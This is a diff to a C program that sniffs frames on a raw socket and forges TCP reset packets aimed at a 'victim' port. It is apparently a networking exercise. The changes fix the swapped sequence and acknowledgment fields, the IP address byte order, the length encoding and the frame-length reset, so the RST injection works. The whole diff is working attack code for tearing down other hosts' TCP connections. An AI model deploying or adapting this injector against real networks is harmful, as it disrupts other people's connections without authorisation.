@@ -118,10 +118,9 @@ int main(int argc, char *argv[]){
 	eh->ether_type = htons(0x0800);
 	socket_address.sll_ifindex = if_idx.ifr_ifindex;
 	socket_address.sll_halen = ETH_ALEN;
-	frame_len += sizeof(struct ether_header);
 
-	// while ((size = read(fd, buffer_in, BUFFER_SIZE)) > 0 && sniffer_done == 0){
-	while ((size = read(fd, buffer_in, BUFFER_SIZE)) > 0){
+	 while ((size = read(fd, buffer_in, BUFFER_SIZE)) > 0 && sniffer_done == 0){
+//	while ((size = read(fd, buffer_in, BUFFER_SIZE)) > 0){
 
 		if(buffer_in[12] == 0x08 && buffer_in[13] == 0x00) {
 			for(i=6;i<12;i++) {
@@ -129,15 +128,15 @@ int main(int argc, char *argv[]){
 			}
 			ip_prot = buffer_in[IP_OFFSET+9];
 			for (i = IP_OFFSET+12; i < IP_OFFSET+16; i++){
-				ip_src[i-(IP_OFFSET+12)] = buffer_in[i];
+				ip_dst[i-(IP_OFFSET+12)] = buffer_in[i];
 			}
 			for (i = IP_OFFSET+16; i < IP_OFFSET+20; i++) {
-				ip_dst[i-(IP_OFFSET+16)] = buffer_in[i];
+				ip_src[i-(IP_OFFSET+16)] = buffer_in[i];
 			}
 			port_src = buffer_in[TCP_OFFSET]<<8 | buffer_in[TCP_OFFSET+1];
 			port_dst = buffer_in[TCP_OFFSET+2]<<8 | buffer_in[TCP_OFFSET+3];
-			ack = buffer_in[TCP_OFFSET+4]<<24 | buffer_in[TCP_OFFSET+5]<<16 | buffer_in[TCP_OFFSET+6]<<8 | buffer_in[TCP_OFFSET+7];
-			seq = buffer_in[TCP_OFFSET+8]<<24 | buffer_in[TCP_OFFSET+9]<<16 | buffer_in[TCP_OFFSET+10]<<8 | buffer_in[TCP_OFFSET+11];
+			seq = buffer_in[TCP_OFFSET+4]<<24 | buffer_in[TCP_OFFSET+5]<<16 | buffer_in[TCP_OFFSET+6]<<8 | buffer_in[TCP_OFFSET+7];
+			ack = buffer_in[TCP_OFFSET+8]<<24 | buffer_in[TCP_OFFSET+9]<<16 | buffer_in[TCP_OFFSET+10]<<8 | buffer_in[TCP_OFFSET+11];
 			if( ip_prot == 0x06 ) {		// TCP
 				printf("\nIP HEADER:\n");
 				printf("    IP source: ");
@@ -160,39 +159,39 @@ int main(int argc, char *argv[]){
 
 					eh->ether_dhost[0] = mac_dst[0];
 					eh->ether_dhost[1] = mac_dst[1];
-			    eh->ether_dhost[2] = mac_dst[2];
-			    eh->ether_dhost[3] = mac_dst[3];
-			    eh->ether_dhost[4] = mac_dst[4];
-			    eh->ether_dhost[5] = mac_dst[5];
+			        eh->ether_dhost[2] = mac_dst[2];
+			        eh->ether_dhost[3] = mac_dst[3];
+			        eh->ether_dhost[4] = mac_dst[4];
+			        eh->ether_dhost[5] = mac_dst[5];
 					socket_address.sll_addr[0] = mac_dst[0];
-			    socket_address.sll_addr[1] = mac_dst[1];
-			    socket_address.sll_addr[2] = mac_dst[2];
-			    socket_address.sll_addr[3] = mac_dst[3];
-			    socket_address.sll_addr[4] = mac_dst[4];
-			    socket_address.sll_addr[5] = mac_dst[5];
+			        socket_address.sll_addr[1] = mac_dst[1];
+			        socket_address.sll_addr[2] = mac_dst[2];
+			        socket_address.sll_addr[3] = mac_dst[3];
+			        socket_address.sll_addr[4] = mac_dst[4];
+			        socket_address.sll_addr[5] = mac_dst[5];
+                    frame_len += sizeof(struct ether_header);
 
 					packet_size = (sizeof(struct ip) + sizeof(struct tcphdr));
 					iphdr->ip_v = 4;
 					iphdr->ip_hl = 5;
-					iphdr->ip_len = packet_size;
+					iphdr->ip_len = htons(packet_size);
 					iphdr->ip_off = 0;
 					iphdr->ip_ttl = IPDEFTTL;
 					iphdr->ip_p = IPPROTO_TCP;
-					iphdr->ip_src.s_addr = ip_src[0]<<24 | ip_src[1]<<16 | ip_src[2]<<8 | ip_src[3];
-					iphdr->ip_dst.s_addr = ip_dst[0]<<24 | ip_dst[1]<<16 | ip_dst[2]<<8 | ip_dst[3];
+					iphdr->ip_src.s_addr = ip_src[3]<<24 | ip_src[2]<<16 | ip_src[1]<<8 | ip_src[0];
+					iphdr->ip_dst.s_addr = ip_dst[3]<<24 | ip_dst[2]<<16 | ip_dst[1]<<8 | ip_dst[0];
 					iphdr->ip_sum = (unsigned short)in_cksum((unsigned short *)iphdr, sizeof(struct ip));
 					frame_len += sizeof(struct ip);
 
-	        tcp->th_sport = htons(port_server);
-	        tcp->th_dport = htons(port_vitima);
-	        tcp->th_seq = htonl(seq);
-	        // tcp->th_ack = htonl(ack);
+        	        tcp->th_dport = htons(port_src);
+	                tcp->th_sport = htons(port_server);
+	                tcp->th_seq = htonl(ack);
 					tcp->th_ack = 0;
-	        tcp->th_off = 5;
+           	        tcp->th_off = 5;
 					// tcp->th_flags = TH_ACK | TH_RST;
-					tcp->th_flags = TH_RST;
-	       	tcp->th_win = htons(1200);
-	       	tcp->th_sum = trans_check(IPPROTO_TCP, packet, sizeof(struct tcphdr), iphdr->ip_src, iphdr->ip_dst);
+					tcp->th_flags = TH_RST | TH_PUSH;
+	            	tcp->th_win = htons(1200);
+	       	        tcp->th_sum = trans_check(IPPROTO_TCP, packet, sizeof(struct tcphdr), iphdr->ip_src, iphdr->ip_dst);
 					frame_len += sizeof(struct tcphdr);
 
 
@@ -203,6 +202,7 @@ int main(int argc, char *argv[]){
 						exit(1);
 					}
 					printf("Pacote de TCP reset enviado.\n");
+                    frame_len = 0;
 			}
 			// Send the reset packet to client
 		}
